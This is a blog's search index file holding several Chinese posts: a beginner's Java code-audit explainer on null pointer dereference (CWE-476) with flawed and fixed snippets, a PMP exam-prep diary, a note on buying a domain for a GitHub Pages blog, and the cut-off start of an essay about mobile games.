<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java代码审计：空指针解引用</title>
      <link href="/2025/null-pointer-dereference/"/>
      <url>/2025/null-pointer-dereference/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p>CWE编号：CWE-476<br>空指针解引用，NULL Pointer Dereference</p><h1 id="概念解析"><a href="#概念解析" class="headerlink" title="概念解析"></a>概念解析</h1><p>刚开始我看到这个缺陷也是一脸懵，实际查资料之后才发现：哦！原来就是这玩意儿啊！<br>在搞清楚啥叫空指针解引用之前，我们应该明确组成这个词的2个基本概念所代表的含义：<br><strong>1、空指针（Null Pointer）</strong><br>Java不能直接操作指针，其数据类型可以分为基本类型（byte、short、int、long、float、double、char、boolean）和引用类型，基础类型直接存储实际的值，引用类型存储的是对象的引用，而不是对象本身，相当于C&#x2F;C++中的指针。<br>在Java中，我们可以将空指针简单理解引用的对象不存在，返回地址为null</p><p><strong>2、解引用</strong><br>这是理解这个缺陷的最大障碍，很多人因为分不清楚<strong>引用（Reference）</strong> 和 <strong>解引用（Dereference）</strong> 的区别，导致对此缺陷不理解。<br>我们通过一个例子简单说明二者的区别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引用</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解引用</span></span><br><span class="line">System.out.println(str.length());</span><br></pre></td></tr></table></figure><p>引用本身不会直接访问对象内容，只是一个“指向”的概念；（上述例子中声明了一个str变量）<br><strong>通过引用去访问对象的内容（属性、方法等）的过程称为解引用</strong>。（上述例子中调用了length()方法）</p><p>明确了上述两个概念之后，我们就很容易理解什么叫<strong>空指针解引用</strong>了。<br>在访问对象内容（解引用）的时候，如果无法确保引用是有效的（非 <code>null</code>），程序就会抛出空指针异常NullPointerException。</p><h1 id="修复方案-amp-案例"><a href="#修复方案-amp-案例" class="headerlink" title="修复方案&amp;案例"></a>修复方案&amp;案例</h1><p>修复方案非常简单：在使用引用类型的数据前进行判空操作</p><h2 id="eg1-空指针解引用"><a href="#eg1-空指针解引用" class="headerlink" title="eg1: 空指针解引用"></a>eg1: 空指针解引用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// 引用是 null</span></span><br><span class="line"><span class="comment">//不合规示例</span></span><br><span class="line">System.out.println(str.length()); <span class="comment">// 解引用 null，抛出 NullPointerException</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//合规示例</span></span><br><span class="line"><span class="keyword">if</span> (str != <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.println(str.length()); <span class="comment">// 安全解引用</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;String is null, cannot get length.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="eg2-解引用未初始化的对象"><a href="#eg2-解引用未初始化的对象" class="headerlink" title="eg2: 解引用未初始化的对象"></a>eg2: 解引用未初始化的对象</h2><p> 不合规代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UninitializedObjectExample</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        String name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// 引用未指向任何实际对象</span></span><br><span class="line">        System.out.println(person.name); <span class="comment">// 解引用 null，抛出 NullPointerException</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复方案：确保在使用前正确初始化对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UninitializedObjectExample</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Default Name&quot;</span>; <span class="comment">// 初始化字段</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(); <span class="comment">// 确保对象被正确初始化</span></span><br><span class="line">        System.out.println(person.name); <span class="comment">// 安全解引用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="eg3-解引用已释放的资源"><a href="#eg3-解引用已释放的资源" class="headerlink" title="eg3: 解引用已释放的资源"></a>eg3: 解引用已释放的资源</h2><p>不合规代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClosedResourceExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;example.txt&quot;</span>));</span><br><span class="line">            reader.close(); <span class="comment">// 释放资源</span></span><br><span class="line">            System.out.println(reader.readLine()); <span class="comment">// 解引用已关闭的资源，抛出 IOException</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合规代码：通过<code>try-with-resources</code> 确保资源在使用后自动关闭，避免手动操作的错误。</p><blockquote><p>PS：<code>try-with-resources</code>是Java7中引入的资源管理机制，用于在代码执行完毕后自动关闭实现了 <strong><code>AutoCloseable</code></strong> 接口的资源（如文件、数据库连接、网络流等）。资源声明在 <code>try</code> 的括号中，当 <code>try</code> 块执行完毕（无论是否抛出异常），资源会被自动关闭（调用 <code>close()</code> 方法）</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClosedResourceExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;example.txt&quot;</span>))) &#123;</span><br><span class="line">            System.out.println(reader.readLine()); <span class="comment">// 安全解引用</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// reader 自动关闭，无需手动关闭，避免解引用已释放资源</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="审计思路"><a href="#审计思路" class="headerlink" title="审计思路"></a>审计思路</h1><p>推荐工具审计。<br>人工审计的方式就比较笨，得花时间一个个看，难度很低，但没有必要。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://blog.51cto.com/u_16213329/7144941">Java 空指针在检查后解引用_mob64ca12d78ba3的技术博客_51CTO博客</a></li><li><a href="https://juejin.cn/post/6844903446185951240">深入理解 Java try-with-resource 语法糖深入理解 Java try-with-resource 语 - 掘金</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PMP备考总结——考试混子的心路历程</title>
      <link href="/2025/pmp-experience-sharing/"/>
      <url>/2025/pmp-experience-sharing/</url>
      
        <content type="html"><![CDATA[<h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><p>5月初，开始了解PMP考试相关信息；<br>5.11日，经同事推荐报了培训班，完成缴费；<br>6.18日，培训班问我是否参加8.31日的考试，感觉还有两个多月的时间，觉得可冲；<br>7月，学习10天共11h6min。这个时间里面还含有水分的，我总是一边学习一边做其他事情，这导致我的进度非常慢，慢到我觉得还是延考好了；</p><ul><li>7.9日，报名8.31号考试。</li><li>7.25日，办理延迟考试到11.30日。因为每天都不想学习，1天打鱼1个月晒网，两个月了一章都没学完；<br>8月，学习1天共48min。办理了延考，离考试时间还很长，玩的心安理得……<br>9月，学习7天共7h48min。离考试时间还很长，玩的心安理得……<br>10月，学习7天共9h52min。</li><li>国庆节回家躺着，去厦门玩，无心学习；</li><li>10.13日，只看了1&#x2F;3的视频课不到，感觉再不学真的来不及了，我的五千多块钱要打水漂了，五千多我都可以出去旅游一趟了…..出于舍不得我的血汗钱，我又开始备考了；</li><li>10.14日晚制定计划：在18号出发海南前把剩下的2&#x2F;3课程全部水完；</li><li>10.18日，最后花了约8h完成了上述计划；<br>11月，学习13天共27h54min。</li><li>11.7日，本月第一天学习，花2h写了一套模拟题。</li><li>后面一直到考试，都在刷题，总结提升，刷题，总结提升…..中循环</li><li>11.30日，被分到华东理工考试<br>12.31日，出成绩，2A1T通过了。</li></ul><h1 id="备考过程"><a href="#备考过程" class="headerlink" title="备考过程"></a>备考过程</h1><h2 id="报班"><a href="#报班" class="headerlink" title="报班"></a>报班</h2><p>如果自学能力还行，我不太推荐报班。课水的一批，题目问老师不如问AI。<br>如果公司给报销的话，报吧！方便。我选择报班之后，除了备考外的大部分信息，都是培训机构搞定的，我也从来不关心啥时候要报名啥时候办延考，看群里通知就行。</p><p>不报班的话，某宝上有可以帮忙给提供机构学时的服务，价格比报班便宜很多。网课的途径那就是五花八门，pdd几块钱十几块钱要啥有啥。</p><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>于我个人而言，我觉得这个阶段并不那么重要。在这个阶段我只看了培训班的网课和讲义PPT，我几乎都是开1.5倍速看的。前面由于对PMP的重点还不太了解，我还认认真真的做笔记，在讲义上涂涂画画的，后面越来越发现好多东西其实都不重要（至少对于通过考试来说）。所以整个7-9月我花了约20h的时间，却只过了1&#x2F;3的内容，而在10月份我只花了约8h的时间把剩下的2&#x2F;3全部过掉了，基本是倍速+疯狂拽进度条的方式。</p><p>在整个PMP备考期间我几乎没有依靠PMBOK，刚开始学不明白的时候我也去翻过几次，但翻书不但没有解决我的问题，还让我有了从大海里捞针的感觉——我要从一堆密密麻麻得文字里翻到我想要的内容，我觉得这种解决问题方式的效率实在是太低了。所以后面我再也不碰PMBOK。</p><p>时间充裕的话，我建议还是按部就班的来，一步一步稳扎稳打，这样考试的时候也不至于像我一样撞大运。最简单的就是去某乎某书等平台上去看人家的类似备考经验分享，大概看个几篇，就知道整个备考的学习过程要做哪些事情了。</p><h2 id="一轮刷题"><a href="#一轮刷题" class="headerlink" title="一轮刷题"></a>一轮刷题</h2><p>非常快速的过完一遍所有的知识点以后，我建议就是马上开始刷题，而且是成套成套的刷题，而不是去刷各种单元&#x2F;小节检测题。我曾经去刷过单元练习题，费时间不说，有些题目的知识点真的是冷门又离谱。</p><p>一轮刷题的目的重在<strong>把握整体的考试方向</strong>。题目错了就错了，在这个阶段无关紧要。<br>这个阶段最重要的就是有一个全局视角，你要大概知道大概知道以下信息</p><ul><li>考啥？可以看看哪些知识点经常换着花样出现在各种题目里，出现的频次如何来判断。比如敏捷在讲义了占了很大一部分，实际考点无非是那几个会议，工具，理念。</li><li>对考点的掌握程度要求？比如PMP里面其实也是有一些公式的，如果你持续不断的去纠结他们的计算，这简直是浪费时间，PMP大概率不考或者只会考一些简单的计算。</li></ul><p>11.7号我才进到这个阶段，那天做了一套题目，180题对了102题，成绩不合格。<br>这个阶段我刷的题目来源于培训班提供的题目，以及我在考试宝APP上面刷题（大学知道的这个app，毛概马原都靠它），它上面现在有AI可以用了，整体还不错。</p><h2 id="知识点归纳总结"><a href="#知识点归纳总结" class="headerlink" title="知识点归纳总结"></a>知识点归纳总结</h2><p>这个阶段的目的就是根据上一阶段对大局和整体的把握来补充细节，更具体的说，是去解决上一个阶段遗留的错题。</p><p>我首先把我一轮刷题中的所有的错题翻出来，这个过程中自动把他们分成两类：</p><ul><li>知识点错题。是因为没有记住某个具体的知识点，导致题目做错。比如说当你不知道石川图是啥，能解决啥问题，那你遇到这类题目只能乱选；又或者你分不清敏捷里面各种会议都在干啥，而它又是一个非常大的考点，所有的这类题目你都只能蒙。</li><li>易错题。这类题目要么是抠字眼的题目，要么是两个答案都很合理（如果你所用的刷题软件&#x2F;题库会显示大家刷题的选项分布，看到两个模糊不定的答案大家选择的占比差不多的时候，比如选C的人占48%，选D占45%，就是这类题目）。</li></ul><p>整个备考过程中，我只会去解决第一类问题，这类问题是花少量时间很看到很大收益的。只要你搞定了这个知识点，这一类的题目基本都能做对。<br>对于易错题，我基本不管。对于抠字眼的题目，我要花大量的时间去记住这些细小的点，投入产出比太低，我拒绝投入。对于两个模糊不定的答案，如果这道题我选对了，并且我能理解这道题的逻辑，那直接不用管了，因为合乎我的逻辑，下次遇到基本也能做对；如果我选错了，我会简单尝试去理解正确答案，如果想一遍无法理解，那我也不管了，有些狗屎逻辑就不用去管他，不影响通过考试。如果你愿意，b站上有这样的易错题目讲解，我听了一两个这样的视频，理解也理解不了，记也记不住，也懒得记。</p><p>把错题的知识点先都记录下来，累积到一定量的时候（这个我是靠感觉），开始回顾整理，根据对考试整体的把握和错题的知识点积累，对PMP所有的知识点做一个快速的梳理和总结。</p><p>我回顾整理的方式还是听视频课+看讲义，跟第一轮学习的时候不一样的是，我会先翻讲义PPT，看到匹配上我上一阶段总结的重要知识点时，我才会去看视频课，视频课我也只看那些关键的知识点。PMP的每一节都有输入输出工具，还有一些七七八八的内容，这些对于我考试来说都是废话。</p><h2 id="二轮刷题"><a href="#二轮刷题" class="headerlink" title="二轮刷题"></a>二轮刷题</h2><p>还是成套成套的刷题，上一轮刷题是为了抓考试的大方向，这一轮就要关注具体的知识点了。<br>检验上一轮归纳总结的知识点是否有用，是不是还有要补充的。</p><p>这一轮如果还出现知识点的错题，一定不能放过。二轮刷题也是验证自己一轮刷题对考点的把握是否准确，以及去完善它。不断的刷题，补充记忆知识点，刷题，补充……一直循环到考试。</p><p>在整个刷题的过程中遇到任何问题，请别去问你的培训班老师，直接复制或者OCR识别文字丢给ChatGPT，他会给你答案。你还可以让他给你解释相关的知识点。非常nice</p><h2 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h2><p>考前</p><ul><li>早睡早起，不要迟到，带好证件；</li><li>冬天多穿点，不然在考场静坐几个小时真的冷的要死；</li><li>带点纸吧，一直吸鼻涕真的很吵；<br>考试ing</li><li>认真听监考老师和喇叭说的内容，把各种要填的信息都填好，别因为这些东西导致成绩作废；</li><li>把握好整体时间，慢了的话要及时调整；</li><li>如果不是稳如老狗，千万要仔细读题，一般时间都是来得及的，要不然想想2500的补考费呢？</li><li>不要被提前交卷的人影响。不要看到别人都交卷了，然后就也想快点写完交卷，从而影响自己的发挥，只要不是进度落后，就按着自己的节奏来就好。<br>考后</li><li>如果所在的考点风景不错的话可以逛逛~</li><li>该吃吃该喝喝</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>PMP是一门认证考试，目标就是通过就行，至于所花时间的长短，以及备考的形式，我觉得这都是因人而异的。我个人在所有的这类考试上都不会有太大的投入，抓大放小，抓框架放细节。我的备考经验不具备普适性，它跟我的性格、能力以及习惯有关，里面有很多模糊的描述，我也不打算把它完善到成一个严谨的version。如果你实践发现在学习的时候理解不了PMP的内容，那你应该去看一看PMBOK的；如果在一轮刷题的时候抓不到考试的重点，那这种方式显然是不适合你的。我更推荐去看网上那些按部就班的备考计划，它们的普适性更强。</p><p>在备考的过程中，请用好AI这个工具！！！</p><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>在拿证的过程中，感谢豆豆在学习计划&#x2F;报名的帮助；<br>感谢曼姐的资料，以及不断的鼓励，她的鼓励给了我极大的信心；<br>感谢李伟涛和张文杰给的资料，谢谢。</p><h1 id="附：知识点"><a href="#附：知识点" class="headerlink" title="附：知识点"></a>附：知识点</h1><p>一个简单的总结</p><p>1、项目管理生命周期：了解几个阶段，每个阶段在干啥</p><p>2、项目管理方式：预测、敏捷、混合</p><p>3、项目组织结构：职能型、弱矩阵、强矩阵。掌握程度：能根据题目的描述判断是哪种权力分布，进而判断PM该怎么做</p><p>4、领导力风格：放任型，交易型…..看到描述能分辩类型</p><p>5、各类文件：项目章程，质量文件，项目管理计划……在哪个阶段制定，里面大概有哪些内容</p><p>6、三大基准：范围、进度、成本</p><p>7、各类工具：这些知识点往往在各个章节里面都有出现，同一个工具可以应用在项目管理的不同阶段，不应该割裂的来看，而是把他们当成一个整体。</p><ul><li>分析工具：挣值分析、偏差分析（SV、CV、SPI、CPI）、趋势分析、蒙特卡洛分析、成本效益分析、决策树分析……</li><li>各种图：直方图、散点图（帕累托图）、亲和图、流程图、矩阵图、石川图、控制图……</li><li>资源优化工具：资源平滑、资源平衡、赶工。</li><li>进度压缩工具：快速跟进、赶工</li><li>其他工具：会议、投票……</li><li>……</li></ul><p>8、各种流程：变更流程、问题流程、风险流程</p><p>9、资源管理-塔克曼模型：熟悉每个阶段的特点</p><p>10、沟通管理-沟通方法：交互式、推式、拉式</p><p>11、风险管理</p><ul><li>风险应对措施：上报、回避、减轻、转移、接受</li><li>机会应对措施：开拓、提高、分享、接受、上报</li></ul><p>12、采购管理-合同：总价、工料、成本补偿</p><ul><li>不同的合同类型及适用场景</li></ul><p>13、敏捷项目管理</p><ul><li>什么情况下该用敏捷</li><li>敏捷团队构成及职责</li><li>敏捷里面各种会议在啥时候进行，主要目的是干啥</li><li>敏捷里面的各种工具（燃尽图、燃起图、发射源……）</li></ul><p>14、PMP做题技巧</p><ul><li>要有人文关怀。成员出问题了要沟通，能协商的要协商</li><li>如果有个假大空的答案和一个具体的措施，选假大空</li></ul>]]></content>
      
      
      <categories>
          
          <category> 考证 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pmp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我终于有属于自己的域名啦！！！</title>
      <link href="/2023/my-new-domain-name/"/>
      <url>/2023/my-new-domain-name/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前在<a href="https://www.freenom.com/">Freenom</a>上白嫖了 jenchoi.tk 这个域名， 用了差不多将近一年，主要写了些技术博客，把博客放在简历里，一切似乎风平浪静。</p><p>最近入职了新公司，好些时间没有管我的博客了，前些天通过域名访问的时候，突然发现访问不了了。起初我以为是手机没有挂梯子，有时候访问不到GitHub也很正常（博客托管在GitHub上），当时并没有在意。后面Vercel也多次发邮件告诉我域名有问题，我就上GitHub的发布页面看了下，发现也提示有问题，我就猜到，这个白嫖的域名应该是G了。后面又看到Freenom的一些新闻，确信域名是没了。。。至于是被回收了还是怎么的，我也不太清楚了，后面我尝试过几次，想重新去Freenom把域名注册回来，结果Freenom的网站访问奇慢，根本用不了，不管挂梯子与否，都差不多，于是我放弃了。</p><p>白嫖的域名失效以后，我意识到，白嫖的东西存在很大的不稳定性。后面我就一直在想：要不要买一个域名？</p><h1 id="要不要买域名？"><a href="#要不要买域名？" class="headerlink" title="要不要买域名？"></a>要不要买域名？</h1><p>买域名必定要花钱，只不过是花钱多少的问题。</p><p>But, 我的问题就是不愿意花钱！就说搭个博客吧，用的GitHub Pages + Freenom白嫖的域名。嫌图床贵，又怕免费的不稳定，所以直接把图片存GitHub里了，但是加载真的巨慢。。。受不了。。后面记笔记的时候，用Obsidian+坚果云，同步到手机还要把图片全部同步过去，我觉得贼麻烦，终于剁手了阿里云的OSS。</p><p>如果单纯要发博客，那我完全可以用GitHub的子域名，所以要不要花钱买个域名，对我来说就是一个值得讨论的事情。我大概考虑了以下几个方面：</p><p><strong>1、购买域名的用处</strong></p><ul><li>主要用于博客，简短的顶级域名更容易记忆</li><li>emmmm….好像没其他的了</li></ul><p><strong>2、价格</strong></p><p>因为用途不大（对我来说只有访问个人博客），如果价格过高，那我宁愿将就着用GitHub的子域名。于是我去阿里、腾讯、华为这些大公司的域名购买站点，搜索jenchoi相关顶级域名，一番对比下来，发现jenchoi.top最便宜，10年188，续费10年290（阿里）。而且top这个顶级域名的寓意也还不错，这个价格我还能接受。</p><blockquote><p>对我来说，确定了一个域名，以后应该是不会更换了，所以在价格上，除了关注新注价格以外，我会关注续费价格。有些域名新注价格很便宜，续费价格翻了好几倍，难道一个域名用十年，又换一个吗？那不如不买。</p><p>TIPS：不同域名注册商的价格会不一样，在大公司里挑便宜的买就行。</p></blockquote><p>有需求，价格合适，大概率是确定要买的。</p><p>而且这个事情我是第二次看了，说明我内心挺想要个自己的域名的。</p><h1 id="买它！！！"><a href="#买它！！！" class="headerlink" title="买它！！！"></a>买它！！！</h1><p>既然决定要买了，前期也看好价格，知道哪家便宜了，那咱就直接开冲吧！</p><p>加购，选择10年，我以为就能直接下单了</p><p>没想到还要创建实名认证模板，填入个人信息之后，就进入审核期了……</p><p>审核还是蛮快的，审核通过之后就收到了邮件</p><p>然后，付款！</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20231108111955899.png" alt="image-20231108111955899" style="zoom:33%;" /><p>nice！！！</p><h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>既然域名到手了，那就得赶紧配置起来</p><p>找到了GitHub官方的配置文档：<a href="https://docs.github.com/zh/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site">管理 GitHub Pages 站点的自定义域 - GitHub 文档</a></p><p>跟着文档的指导，配置了如下域名解析记录</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20231108112034424.png" alt="image-20231108112034424" style="zoom:50%;" /><p>然后等个大概几分钟十几分钟的样子，等域名解析生效。</p><p>在此期间，可以去Github的仓库里也配置一下域名，开启强制HTTPS就行啦。</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20231108112012853.png" alt="image-20231108112012853"></p><h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><p>生效之后，就可以通过域名访问到自己的博客啦~</p><p>肥肠的nice~</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20231108112046442.png" alt="image-20231108112046442"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>游戏与人生：我从【饥饿鲨-进化】上学到了什么？</title>
      <link href="/2023/thinking-of-hungry-shark-evolution/"/>
      <url>/2023/thinking-of-hungry-shark-evolution/</url>
      
        <content type="html"><![CDATA[<h1 id="我与游戏"><a href="#我与游戏" class="headerlink" title="我与游戏"></a>我与游戏</h1><h2 id="关于端游"><a href="#关于端游" class="headerlink" title="关于端游"></a>关于端游</h2><p>上小学的时候，酷爱打游戏，下课网桌子上一坐，就开始和同学讨论游戏，什么飞车、洛克王国、炫舞、TNT、泡泡堂，玩的不亦乐乎，3366小游戏基本被我玩了个遍，都被我玩倒闭了（手动狗头），4399和7k7k现在还活着呢。那时候家里有电脑，一天净是折腾这些玩意，还因此被班主任教训了一顿。</p><p>那时候都是网页游戏，也有要下客户端的，但我玩的都是网页游戏。初二的时候，电脑被爸妈搬到厂里办公室去了，家里到厂里虽然不远，但是每天吃了晚饭走到厂里，没玩一会，就要回家睡觉了，第二天还得上学，就这么折腾了一周之后，我觉得太累了，之后，我就不这么折腾了。</p><p><strong>从那之后，我就几乎告别了端游</strong>。</p><h2 id="关于手游"><a href="#关于手游" class="headerlink" title="关于手游"></a>关于手游</h2><p>关于手游，小时候用按键手机玩推箱子、贪吃蛇、连连看这些游戏，那是很久远的事情了。</p><p>后来就是智能手机刚问世那会，我爸爸买了一台，那时候我用他的手机玩过摩托车游戏，那时候觉得新奇，控制摩托车不需要通过左右按键了，而是直接左右摇晃手机就行。现在我知道那是通过传感器来实现的，当时觉得牛逼坏了。</p><p>后面腾讯游戏开始搞手游了，天天酷跑应该算是首当其冲，那时候天天借叔叔他们的手机来玩这个游戏，因为我自己没有手机，叔叔他们也要上班，我要上学，天天借他们手机，也麻烦，跟我放弃端游的想法一样，手游也被我放弃了。</p><p>那个时候，天天酷跑最厉害的角色还是金枪小帅，下载游戏也仅仅几十M的流量。后来它火了，角色越来越多，安装包越来越大，玩的人越来越多，但我不玩了。</p><h2 id="游戏态度"><a href="#游戏态度" class="headerlink" title="游戏态度"></a>游戏态度</h2><p>上面那个两次事件过去之后，我几乎不怎么玩游戏了。</p><p>这些年，我和游戏基本维持在：</p><ul><li>在3366关站之前，玩了一些小游戏</li><li>暑假放假在家的时候，偶尔和弟弟妹妹们一起玩玩h5多人游戏</li><li>沉迷了一段时间的【鲜果串串烧】，因为flash的安全问题，导致被越来越多的浏览器禁用，玩游戏越来越麻烦，就不玩了</li><li>偶尔会在手机上下一些单机游戏，一般都是些益智类的游戏，或者是小孩玩的<ul><li>给小鳄鱼洗澡、喂青蛙吃糖、2048、别踩白块、神庙逃亡、地铁跑酷、饥饿鲨进化</li></ul></li></ul><p>事实上，这些游戏很少能在我手机上能待够一天，更别说一周一个月了。我只是某一刻觉得想玩了，下载下来玩一玩，消遣一下，当天一般就删了。</p><p>新游戏层出不穷，我全然不感兴趣，哪怕是周围的人都在玩，也都拉我玩，我也没有下载过王者荣耀，绝地求生这些火爆的游戏。</p><p>手机上常年没有游戏app，偶尔出现单机游戏。这就是我对游戏的态度了。</p><h1 id="契机"><a href="#契机" class="headerlink" 